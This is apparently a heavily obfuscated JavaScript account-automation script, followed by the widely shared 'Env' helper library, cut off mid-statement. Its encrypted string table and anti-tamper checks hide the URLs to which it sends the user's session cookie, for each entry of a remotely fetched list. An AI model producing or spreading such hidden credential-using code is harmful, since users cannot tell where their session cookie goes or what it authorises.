var _0xodR='jsjiami.com.v6',_0x2183=[_0xodR,'wpzDjmJbw4M=','wpHCvyhuw6U=','w6o4wq/DkGM=','PDJKDVE=','aA3DjHTDqQ==','K0JdaSk=','w4fChsKABA==','UMOBKk3orrrmsZ7lpbPotZ/vvL/orrTmoqfmn7Hnvobot4Pph63or70=','wrI5WnlNPDE=','w5hcAXZm','wrLDtcOyCxM=','Em/CuHI1U8O+','wrtZScO4wq3Cqg==','wqTCklrDucO3','Aw0QU3o=','JAUAT3s=','wrtTQMOawqvCsA==','OQZABnc=','csO7aBBcA8Oz','wp/CtX7Dm8Ovw6BlXCHCh2sg','LzjCqnDDl8OR','w4LCv8OkRWZdXnrDu8KRwpci','w59cGnE=','ZcOBw4LCpMOv','cVJXJho=','wofDh8OgHwM=','wqHDlcOlGR0=','ZcONXjZh','woI1IsKjw7wH','wrFkY8OMwq4=','woNVYMONwqE=','wqLCsnvDqMOl','RcOjwrnCvcK8','wp1wecOGw4k=','w4NgesOTHw==','w6zCicOrQHI=','J8KuJi0h','w4jClMKAwrTDqw==','woY1fMOkw7k=','w4lNGituDMKuf2cme3M=','wo8fwrTCqMK+w7jDocOvQ8OgwolOwqrCgMOGw6pGYHHClxkndC7Dm8K2OmM4HEbCkF4=','HMKNOzY0w4PCicKMMMOCw7DDjcKZw5HCjEVLSMK6','wpHCoVXDisKxwqdgUCnCgmQzw4xdJsKPcQ==','wr/DiMOTKEliKnjCt8Kb','w5JxeMOME8KPPcOIw4l4w6rCisOGw4XCnkbDjsOSwo90wrs/esKMDcOePhfCtDLCrTFD','QMK6wrzChBkXaMOsw6zCjMKFXC8ZAcOl','w7lSXcOh','w43CiMOowpfChW7DrsOmw4rCnE4rGU3CtsKBw73DvDTDtGXCrcOfwr0MwpwofMO/w5YhHsKqUXfDp8K8C1/DncO7w4lVT8Ogw5DDmHM4w5DCkWTCssKoN0LDpcOiw7HCjcO4wrJRDMKCwpZnwoLCjcKcL2DDi8K8aTDCgsKgMw4Vw4QxLcKWwrwqw5hiECXDusOrDRbCucO9wpjCkRNvwoVRAEvCp8OgwpLDuCtgw6lINMKBwoUqHSA7w4jCs8Otw7fCnMOsKS0Pw7fDjwcLA8O/YTVCw43DusKow7lww7w0w40Fw5QcVCUuwrzDrQ==','DsKRYiUp','wpRrw5DCv8KFXAbChMOTSg==','w5rCj8KCEcK6eg==','wovCh2HDsCFMVTPDpHLCthRgQsOawrE3f8KnOjJ9wpFcw4dbw7UCBjDCl1XChHg=','wrxUZcO8wrM=','w7DCjMKgwr/Dqw==','SnRbDBw=','w582wrzDuGY=','UmvDi1TChg==','W8K8w6NZWA==','fsOHwpDCsMKzNA==','JjPCsg==','XMOJQyRII8OVMcODSH5ywow=','wpFrLg==','w4YIKsKFWW7CuSMlw49xw7Ij','w5DCk8KHAsKb','JWLCiVId','w7fDosKnwpTDrcKnwoVteEQ=','PQ96OkdhBw==','asOWw7zCm8OD','FBAjTn7DuBY=','w4EFwqbDrE8=','wqDDgMOTHxE=','fsOuaAFoXMKoQcOqOhVRw7YtEjYpO8KqDgZjw6dBw4fDqRrDicOTXcKHwq48w53CkcOtXcO6w7vDkMKWw4zDiD/DomzCvlkiTiIMw4DDpHzDu0AKw4HCq8O3wrvDuDLDk0TCvhjCksKgBsOgwoDDuUDDvkfCrBXCt2gQwrLCsMKNKMKCwrTCscKfCAQTFCfChmjCpAkMFcO9w4YqwpPCqEg=','wpV2acOZR8OcesOQw45wwrnCg8OAw5fChRXDhMKBwpJ1w75tIMKSPsOeJRzDuS8=','w63CtsKPKMKg','wobCuMOnLT/CuMKhNhjDiMOewq5KeWzCq8OGwq/DkGF9w7zCr0LDqMOdwqzCmMO8amHCssO7wqgJCmwewrfDlMK3wrXCpmLCtRU=','EsO+wplBZSTDp8KXw64BPcKFw7N9acKNw4HCjMKBSlEBwqfDucKoK3TDqkhkGsKPw7PDkglMEFguw64=','w7jCj8ODKwFxFnjCosOcw6fDuX8pbsKmKAzCjcKvw6IRwqZXbcKYV1RlIsKSw4jDuMOcUsKPa2jDqMOJwpdCwoVUwo0=','wrl/dsOQwoo=','wosIasOmw50=','OFrCnVch','DMKtK8KoCA==','esO6wrLCtMKG','cnB+BCA=','w45SFWRX','UELDu0U=','wqsoDsK1w5Y=','TcOjwrDClsK0','w7xAesOEDQ==','T3RW','HsOhF2E=','wovCkMO2beivo+axuOWkjui0tu++meisj+agueaeoOe/nOi0hemEqeiupg==','Hxow','woAOwqnCoQ==','UzQHY+ivqOazjuWlhui0ve+8keist+aguuaeoOe8mui0oemGs+ittQ==','AMOhCHco','w79MRMOWEQ==','wqvCjRlIYw==','w6lga8OvCQ==','wrrDhEM=','w4zDkMKPwqM=','EMKTw6t96K+h5rCD5aak6Le8776D6K6b5qKY5p2C576Y6Law6YaG6K20','w6A0EsKVeFk=','wpfCh8OvCiU=','wpVtScOPwoo=','wrAuUwEm','wq/DuGjDtsOl','OCMfb2Y=','NF1vZj4=','w7HCgMKAwqzDoA==','worCtTlCZg==','w4MhwqvDhXjCjEnDi1TDv8O7w6HDvsOSD8OBwofDmcOaYcOswrATN8K0w4fCojnCr0Jww4EYw4nCjT14wrgyKynCv8OnwpPCggjDu8OQacKJw6bDrMOmwpIVPAvDpMKRw77DpgsJZRd5dgTDh8K2wplmEhcSBTxz','w75ucsOJFsKAPcKTwpU5wrTChcKEw5/CoUDCjcKcwp4qw6MIBcKpQcOWBxHDt3zDoj4mKsOtazDDgiR8w79ywqPCl8OIGyY9w53Co8KrFUp4VMKHNxZuw5DCtgLDsyUmG09DQn4Ew5bCisKXwq7Dk8OWw4VfwpXDvzoyX27Dg8OywpUuw4bDu8O3wq3CrzbCunrCq07DklvDllDCnsKxUcO+wpnCj3MdwooeeMKTwrfCnBdkDMKKw4zCksOHwr7CnsOywpDDuhgedS8nwr7DkRLDh8OWwo7DlcOVSyPDg1vDq8OfKiXCiwHDpBJXw6g=','LMKoHMKyGA==','wpDCuztIw5Q=','H1VXaxg=','Z8Ovw5tbwoY=','V2JbBDo=','w7HCisK2wrvDrw==','wr3Do3F0w5k=','eMOpw6Z8wos=','w5bCuDHDvcOY','wr7Cs3TDu8O1','cCPDjErDtw==','E33CjVof','w5DCt8KpwojDsg==','wofCqMO9','RjsFuCIjYfiRPahmki.GcpomXHyh.v6=='];(function(_0x2a6248,_0x280c6f,_0x4a6707){var _0x22f5c5=function(_0x474fe9,_0x2a056e,_0x2e911e,_0x314dd6,_0xf6999a){_0x2a056e=_0x2a056e>>0x8,_0xf6999a='po';var _0x269665='shift',_0x142cb1='push';if(_0x2a056e<_0x474fe9){while(--_0x474fe9){_0x314dd6=_0x2a6248[_0x269665]();if(_0x2a056e===_0x474fe9){_0x2a056e=_0x314dd6;_0x2e911e=_0x2a6248[_0xf6999a+'p']();}else if(_0x2a056e&&_0x2e911e['replace'](/[RFuCIYfRPhkGpXHyh=]/g,'')===_0x2a056e){_0x2a6248[_0x142cb1](_0x314dd6);}}_0x2a6248[_0x142cb1](_0x2a6248[_0x269665]());}return 0x7a29c;};var _0x5ca593=function(){var _0x547d98={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x57cacd,_0x4a6331,_0x407003,_0x12419c){_0x12419c=_0x12419c||{};var _0x1d8083=_0x4a6331+'='+_0x407003;var _0x1743e9=0x0;for(var _0x1743e9=0x0,_0x41ef2d=_0x57cacd['length'];_0x1743e9<_0x41ef2d;_0x1743e9++){var _0x33b168=_0x57cacd[_0x1743e9];_0x1d8083+=';\x20'+_0x33b168;var _0x4b3783=_0x57cacd[_0x33b168];_0x57cacd['push'](_0x4b3783);_0x41ef2d=_0x57cacd['length'];if(_0x4b3783!==!![]){_0x1d8083+='='+_0x4b3783;}}_0x12419c['cookie']=_0x1d8083;},'removeCookie':function(){return'dev';},'getCookie':function(_0x4113a8,_0x29bd1d){_0x4113a8=_0x4113a8||function(_0x3aee5e){return _0x3aee5e;};var _0x18cf85=_0x4113a8(new RegExp('(?:^|;\x20)'+_0x29bd1d['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0xf0dd79=typeof _0xodR=='undefined'?'undefined':_0xodR,_0x5368f6=_0xf0dd79['split'](''),_0x4b34f9=_0x5368f6['length'],_0xc5db7d=_0x4b34f9-0xe,_0x244ad7;while(_0x244ad7=_0x5368f6['pop']()){_0x4b34f9&&(_0xc5db7d+=_0x244ad7['charCodeAt']());}var _0x1bf18f=function(_0x1ddbda,_0x20acc8,_0xae710a){_0x1ddbda(++_0x20acc8,_0xae710a);};_0xc5db7d^-_0x4b34f9===-0x524&&(_0x244ad7=_0xc5db7d)&&_0x1bf18f(_0x22f5c5,_0x280c6f,_0x4a6707);return _0x244ad7>>0x2===0x14b&&_0x18cf85?decodeURIComponent(_0x18cf85[0x1]):undefined;}};var _0x41b813=function(){var _0x1a8750=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x1a8750['test'](_0x547d98['removeCookie']['toString']());};_0x547d98['updateCookie']=_0x41b813;var _0x39ccf7='';var _0x5dbb2b=_0x547d98['updateCookie']();if(!_0x5dbb2b){_0x547d98['setCookie'](['*'],'counter',0x1);}else if(_0x5dbb2b){_0x39ccf7=_0x547d98['getCookie'](null,'counter');}else{_0x547d98['removeCookie']();}};_0x5ca593();}(_0x2183,0x11f,0x11f00));var _0x48c4=function(_0x44317a,_0x13e644){_0x44317a=~~'0x'['concat'](_0x44317a);var _0x226181=_0x2183[_0x44317a];if(_0x48c4['bktEjr']===undefined){(function(){var _0x69ec48;try{var _0x6f3ab0=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x69ec48=_0x6f3ab0();}catch(_0x419049){_0x69ec48=window;}var _0x4f46fb='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x69ec48['atob']||(_0x69ec48['atob']=function(_0x39e78f){var _0x33f392=String(_0x39e78f)['replace'](/=+$/,'');for(var _0x5e9a67=0x0,_0x54d5f8,_0x2fef65,_0x2d0e90=0x0,_0x3891b0='';_0x2fef65=_0x33f392['charAt'](_0x2d0e90++);~_0x2fef65&&(_0x54d5f8=_0x5e9a67%0x4?_0x54d5f8*0x40+_0x2fef65:_0x2fef65,_0x5e9a67++%0x4)?_0x3891b0+=String['fromCharCode'](0xff&_0x54d5f8>>(-0x2*_0x5e9a67&0x6)):0x0){_0x2fef65=_0x4f46fb['indexOf'](_0x2fef65);}return _0x3891b0;});}());var _0x4a35b7=function(_0xcbffdb,_0x13e644){var _0x431fc5=[],_0x107dab=0x0,_0x566905,_0x456f14='',_0x245a26='';_0xcbffdb=atob(_0xcbffdb);for(var _0x3b7bd5=0x0,_0x3143db=_0xcbffdb['length'];_0x3b7bd5<_0x3143db;_0x3b7bd5++){_0x245a26+='%'+('00'+_0xcbffdb['charCodeAt'](_0x3b7bd5)['toString'](0x10))['slice'](-0x2);}_0xcbffdb=decodeURIComponent(_0x245a26);for(var _0x3d8f7d=0x0;_0x3d8f7d<0x100;_0x3d8f7d++){_0x431fc5[_0x3d8f7d]=_0x3d8f7d;}for(_0x3d8f7d=0x0;_0x3d8f7d<0x100;_0x3d8f7d++){_0x107dab=(_0x107dab+_0x431fc5[_0x3d8f7d]+_0x13e644['charCodeAt'](_0x3d8f7d%_0x13e644['length']))%0x100;_0x566905=_0x431fc5[_0x3d8f7d];_0x431fc5[_0x3d8f7d]=_0x431fc5[_0x107dab];_0x431fc5[_0x107dab]=_0x566905;}_0x3d8f7d=0x0;_0x107dab=0x0;for(var _0x48be1e=0x0;_0x48be1e<_0xcbffdb['length'];_0x48be1e++){_0x3d8f7d=(_0x3d8f7d+0x1)%0x100;_0x107dab=(_0x107dab+_0x431fc5[_0x3d8f7d])%0x100;_0x566905=_0x431fc5[_0x3d8f7d];_0x431fc5[_0x3d8f7d]=_0x431fc5[_0x107dab];_0x431fc5[_0x107dab]=_0x566905;_0x456f14+=String['fromCharCode'](_0xcbffdb['charCodeAt'](_0x48be1e)^_0x431fc5[(_0x431fc5[_0x3d8f7d]+_0x431fc5[_0x107dab])%0x100]);}return _0x456f14;};_0x48c4['xxwggp']=_0x4a35b7;_0x48c4['IpZKtL']={};_0x48c4['bktEjr']=!![];}var _0x11ca3c=_0x48c4['IpZKtL'][_0x44317a];if(_0x11ca3c===undefined){if(_0x48c4['zmtCgY']===undefined){var _0x4c33db=function(_0x34827b){this['pUwESh']=_0x34827b;this['uIIpYP']=[0x1,0x0,0x0];this['eBZCTG']=function(){return'newState';};this['aDcvSB']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['fTEEwz']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x4c33db['prototype']['Nlqbkl']=function(){var _0x2beefa=new RegExp(this['aDcvSB']+this['fTEEwz']);var _0x57a914=_0x2beefa['test'](this['eBZCTG']['toString']())?--this['uIIpYP'][0x1]:--this['uIIpYP'][0x0];return this['kVxgmW'](_0x57a914);};_0x4c33db['prototype']['kVxgmW']=function(_0x2458b6){if(!Boolean(~_0x2458b6)){return _0x2458b6;}return this['yscRPB'](this['pUwESh']);};_0x4c33db['prototype']['yscRPB']=function(_0x3d14a3){for(var _0x264a9b=0x0,_0x10f631=this['uIIpYP']['length'];_0x264a9b<_0x10f631;_0x264a9b++){this['uIIpYP']['push'](Math['round'](Math['random']()));_0x10f631=this['uIIpYP']['length'];}return _0x3d14a3(this['uIIpYP'][0x0]);};new _0x4c33db(_0x48c4)['Nlqbkl']();_0x48c4['zmtCgY']=!![];}_0x226181=_0x48c4['xxwggp'](_0x226181,_0x13e644);_0x48c4['IpZKtL'][_0x44317a]=_0x226181;}else{_0x226181=_0x11ca3c;}return _0x226181;};var _0x4b7e99=function(){var _0x569b8b=!![];return function(_0xc7e844,_0x4a0ef1){var _0x386442=_0x569b8b?function(){if(_0x4a0ef1){var _0x3dbe44=_0x4a0ef1['apply'](_0xc7e844,arguments);_0x4a0ef1=null;return _0x3dbe44;}}:function(){};_0x569b8b=![];return _0x386442;};}();var _0x5bcadd=_0x4b7e99(this,function(){var _0x2b19a7=function(){return'\x64\x65\x76';},_0x1e3e9a=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x4c1e3c=function(){var _0x90aa04=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x90aa04['\x74\x65\x73\x74'](_0x2b19a7['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x475251=function(){var _0x2359e4=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x2359e4['\x74\x65\x73\x74'](_0x1e3e9a['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0xb31d0b=function(_0x2c1e94){var _0x57d021=~-0x1>>0x1+0xff%0x0;if(_0x2c1e94['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x57d021)){_0x2d208b(_0x2c1e94);}};var _0x2d208b=function(_0x1c3b2f){var _0x3a0825=~-0x4>>0x1+0xff%0x0;if(_0x1c3b2f['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0x3a0825){_0xb31d0b(_0x1c3b2f);}};if(!_0x4c1e3c()){if(!_0x475251()){_0xb31d0b('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0xb31d0b('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0xb31d0b('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x5bcadd();function wuzhi01(_0x254a7b){var _0x2e4d5b={'nCQOS':function(_0x372457,_0x4edd06){return _0x372457===_0x4edd06;},'NdrqS':_0x48c4('0','xBGW'),'NTQDS':_0x48c4('1','McN]'),'mNlkQ':_0x48c4('2','dR]^'),'QkOaP':_0x48c4('3','m%yD'),'fofaT':function(_0x355382){return _0x355382();},'khBcj':_0x48c4('4','Rn!5'),'BkZAn':_0x48c4('5','*EJs'),'iojil':_0x48c4('6','McN]'),'tccMm':_0x48c4('7','^1JA'),'rFCeb':_0x48c4('8','Ok[E'),'knXmN':_0x48c4('9','3gz&'),'ytjch':function(_0x247ac1,_0x4c1885){return _0x247ac1(_0x4c1885);},'SlEAo':_0x48c4('a','UG5i'),'jPyYD':_0x48c4('b','3gz&'),'tmeGu':_0x48c4('c','Ujmh'),'DQbIS':_0x48c4('d','McN]')};let _0x51fa46=_0x254a7b[_0x48c4('e','2(mL')];let _0x332b60=_0x254a7b[_0x48c4('f','pBlc')];let _0x10bc16={'url':_0x48c4('10','i6[Q'),'headers':{'Host':_0x2e4d5b[_0x48c4('11','1tsM')],'Content-Type':_0x2e4d5b[_0x48c4('12','dR]^')],'Origin':_0x2e4d5b[_0x48c4('13','EXcm')],'Accept-Encoding':_0x2e4d5b[_0x48c4('14','Znsf')],'Cookie':cookie,'Connection':_0x2e4d5b[_0x48c4('15','XYjC')],'Accept':_0x2e4d5b[_0x48c4('16','Gk!V')],'user-agent':$[_0x48c4('17','^2fp')]()?process[_0x48c4('18','&V@B')][_0x48c4('19','m$a!')]?process[_0x48c4('1a','4z8P')][_0x48c4('1b','XjVR')]:_0x2e4d5b[_0x48c4('1c','pBlc')](require,_0x2e4d5b[_0x48c4('1d','%q5p')])[_0x48c4('1e','S&1!')]:$[_0x48c4('1f','y7#Z')](_0x2e4d5b[_0x48c4('20','9[Sg')])?$[_0x48c4('21','4lvb')](_0x2e4d5b[_0x48c4('22','Znsf')]):_0x2e4d5b[_0x48c4('23','Ok[E')],'Referer':_0x48c4('24','m$a!')+_0x51fa46+_0x48c4('25','3gz&'),'Accept-Language':_0x2e4d5b[_0x48c4('26','pBlc')]},'body':_0x48c4('27','u3B8')+_0x51fa46+_0x48c4('28','Gk!V')+_0x332b60+_0x48c4('29','Ok[E')};return new Promise(_0x59c5a9=>{var _0x5cc338={'ErKSX':function(_0x33528d,_0x3a9c1b){return _0x2e4d5b[_0x48c4('2a','1tsM')](_0x33528d,_0x3a9c1b);},'ZWnIc':_0x2e4d5b[_0x48c4('2b','m%yD')],'OArdw':_0x2e4d5b[_0x48c4('2c','%q5p')],'LMLvk':function(_0xfce41c,_0x648a21){return _0x2e4d5b[_0x48c4('2d','L9AG')](_0xfce41c,_0x648a21);},'WMubk':_0x2e4d5b[_0x48c4('2e','^2fp')],'ZacOs':_0x2e4d5b[_0x48c4('2f','EXcm')],'wJfDn':function(_0x3d86a9){return _0x2e4d5b[_0x48c4('30','Rn!5')](_0x3d86a9);}};$[_0x48c4('31','XYjC')](_0x10bc16,(_0x183401,_0x180f17,_0x167783)=>{if(_0x5cc338[_0x48c4('32','NZ]h')](_0x5cc338[_0x48c4('33','^2fp')],_0x5cc338[_0x48c4('34','3gz&')])){console[_0x48c4('35','EXcm')]($[_0x48c4('36','$G$z')]+_0x48c4('37','xBGW'));}else{try{if(_0x183401){console[_0x48c4('38','4lvb')]($[_0x48c4('39','*EJs')]+_0x48c4('3a','4lvb'));}else{_0x167783=JSON[_0x48c4('3b','$G$z')](_0x167783);}}catch(_0x5b0fa1){if(_0x5cc338[_0x48c4('3c','3gz&')](_0x5cc338[_0x48c4('3d','3WXH')],_0x5cc338[_0x48c4('3e','3gz&')])){console[_0x48c4('3f','w]t8')]($[_0x48c4('40','S&1!')]+_0x48c4('41','Gk!V'));}else{$[_0x48c4('42','XjVR')](_0x5b0fa1,resp);}}finally{_0x5cc338[_0x48c4('43','u3B8')](_0x59c5a9);}}});});}function shuye72(){var _0x55ccb4={'NFfUC':function(_0x410465){return _0x410465();},'BARDd':function(_0x8a8bb9,_0x2c8467){return _0x8a8bb9!==_0x2c8467;},'zImTn':_0x48c4('44','1tsM'),'tyjaJ':_0x48c4('45','l#ZS'),'CmLEj':function(_0x5c5a51,_0x3810ad){return _0x5c5a51===_0x3810ad;},'kHUFK':_0x48c4('46','S444'),'eOPsc':_0x48c4('47','4lvb'),'QaWkp':function(_0x3a0750,_0x4485e7){return _0x3a0750<_0x4485e7;},'HhHAh':function(_0x2a40f1,_0x4a4cdf){return _0x2a40f1(_0x4a4cdf);},'JaOnG':_0x48c4('48','FMM0'),'esAIm':_0x48c4('49','dR]^'),'bPSvw':_0x48c4('4a','3WXH'),'JeFiQ':_0x48c4('4b','Znsf'),'OBusr':_0x48c4('4c','3gz&')};return new Promise(_0x209d12=>{var _0x59173b={'RWgbk':function(_0x13bf17){return _0x55ccb4[_0x48c4('4d','L9AG')](_0x13bf17);},'Ampeh':function(_0xda1528){return _0x55ccb4[_0x48c4('4e','$c5$')](_0xda1528);},'fXDSw':function(_0x141617,_0x3b9a35){return _0x55ccb4[_0x48c4('4f','FMM0')](_0x141617,_0x3b9a35);},'ROOPY':_0x55ccb4[_0x48c4('50','(u78')],'vVXFU':_0x55ccb4[_0x48c4('51','EXcm')],'RIfCj':function(_0x4c1197,_0x48b1a0){return _0x55ccb4[_0x48c4('52','dR]^')](_0x4c1197,_0x48b1a0);},'pxGye':_0x55ccb4[_0x48c4('53','w]t8')],'WpWed':_0x55ccb4[_0x48c4('54','(u78')],'clNXQ':function(_0xef1550,_0x2b497e){return _0x55ccb4[_0x48c4('55','7Uhe')](_0xef1550,_0x2b497e);},'eGGfh':function(_0x473d15,_0x4f7d7d){return _0x55ccb4[_0x48c4('56','^1JA')](_0x473d15,_0x4f7d7d);},'SjVGg':_0x55ccb4[_0x48c4('57','5HbV')],'uxSAy':_0x55ccb4[_0x48c4('58','%q5p')],'TiGRx':_0x55ccb4[_0x48c4('59','dR]^')]};$[_0x48c4('5a','u3B8')]({'url':_0x55ccb4[_0x48c4('5b','w]t8')],'headers':{'User-Agent':_0x55ccb4[_0x48c4('5c','$c5$')]}},async(_0x2e6368,_0x3e2c7b,_0x235ddd)=>{var _0x31d4e8={'sWBGz':function(_0x524f96){return _0x59173b[_0x48c4('5d','Znsf')](_0x524f96);}};if(_0x59173b[_0x48c4('5e','y7#Z')](_0x59173b[_0x48c4('5f','5HbV')],_0x59173b[_0x48c4('60','FMM0')])){try{if(_0x2e6368){console[_0x48c4('35','EXcm')]($[_0x48c4('61','pBlc')]+_0x48c4('62','$G$z'));}else{$[_0x48c4('63','6Z8l')]=JSON[_0x48c4('64','Rn!5')](_0x235ddd);if(_0x59173b[_0x48c4('65','Ok[E')]($[_0x48c4('66','%q5p')][_0x48c4('67','1tsM')],0x0)){if(_0x59173b[_0x48c4('68','^1JA')](_0x59173b[_0x48c4('69','4lvb')],_0x59173b[_0x48c4('6a','4lvb')])){$[_0x48c4('6b','1tsM')](e,_0x3e2c7b);}else{for(let _0x52abf7=0x0;_0x59173b[_0x48c4('6c','y7#Z')](_0x52abf7,$[_0x48c4('6d','m$a!')][_0x48c4('6e','^1JA')][_0x48c4('6f','&V@B')]);_0x52abf7++){let _0x5d84b5=$[_0x48c4('63','6Z8l')][_0x48c4('70','xBGW')][_0x52abf7];await $[_0x48c4('71','Rn!5')](0x2bc);_0x59173b[_0x48c4('72','9[Sg')](wuzhi01,_0x5d84b5);}}}}}catch(_0x429a8e){if(_0x59173b[_0x48c4('73','EXcm')](_0x59173b[_0x48c4('74','Ok[E')],_0x59173b[_0x48c4('75','Ok[E')])){_0x31d4e8[_0x48c4('76','m$a!')](_0x209d12);}else{$[_0x48c4('77','NZ]h')](_0x429a8e,_0x3e2c7b);}}finally{if(_0x59173b[_0x48c4('78','1tsM')](_0x59173b[_0x48c4('79','1tsM')],_0x59173b[_0x48c4('7a','^1JA')])){_0x59173b[_0x48c4('7b','^2fp')](_0x209d12);}else{_0x59173b[_0x48c4('7c','17jx')](_0x209d12);}}}else{_0x235ddd=JSON[_0x48c4('7d','3gz&')](_0x235ddd);}});});};_0xodR='jsjiami.com.v6';
// prettier-ignore
function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete 